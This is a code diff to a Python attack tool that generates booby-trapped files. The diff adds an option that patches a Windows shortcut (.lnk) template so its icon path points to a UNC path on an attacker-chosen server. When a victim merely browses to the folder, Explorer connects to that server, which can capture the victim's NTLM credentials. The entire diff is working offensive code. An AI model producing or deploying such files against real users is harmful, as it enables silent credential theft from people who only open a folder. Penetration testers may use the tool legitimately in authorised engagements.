@@ -47,6 +47,7 @@ parser.add_argument('-g', '--generate',
 		"all",
 		"scf",
 		"url",
+		"lnk",
 		"rtf",
 		"xml",
 		"htm",
@@ -407,6 +408,26 @@ IconResource=\\\\''' + server + '''\\aa''')
 	file.close()
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
 
+# .lnk remote IconFile Attack
+# Filename: shareattack.lnk, action=browse, attacks=explorer
+def create_lnk(generate,server,filename):
+	# these two numbers define location in template that holds icon location
+	offset = 0x136
+	max_path = 0xDF
+	unc_path = f'\\\\{server}\\tools\\nc.ico'
+	if len(unc_path) >= max_path:
+		print("Server name too long for lnk template, skipping.")
+		return
+	unc_path = unc_path.encode('utf-16le')
+	with open(os.path.join("templates", "shortcut-template.lnk"), 'rb') as lnk:
+		shortcut = list(lnk.read())
+	for i in range(0, len(unc_path)):
+		shortcut[offset + i] = unc_path[i]
+	with open(filename,'wb') as file:
+		file.write(bytes(shortcut))
+	print("Created: " + filename + " (BROWSE TO FOLDER)")
+
+
 # create folder to hold templates, if already exists delete it
 if os.path.exists(args.filename):
 	shutil.rmtree(args.filename)
@@ -418,6 +439,8 @@ if (args.generate == "all" or args.generate == "modern"):
 
 	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
 	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+
+	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
 
 	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
 
@@ -456,6 +479,9 @@ elif(args.generate == "scf"):
 elif(args.generate == "url"):
 	create_url_url(args.generate, args.server, os.path.join(args.filename, args.filename + "-(url).url"))
 	create_url_icon(args.generate, args.server, os.path.join(args.filename, args.filename + "-(icon).url"))
+
+elif(args.generate == "lnk"):
+	create_lnk(args.generate, args.server, os.path.join(args.filename, args.filename + ".lnk"))
 
 elif(args.generate == "rtf"):
 	create_rtf(args.generate, args.server, os.path.join(args.filename, args.filename + ".rtf"))
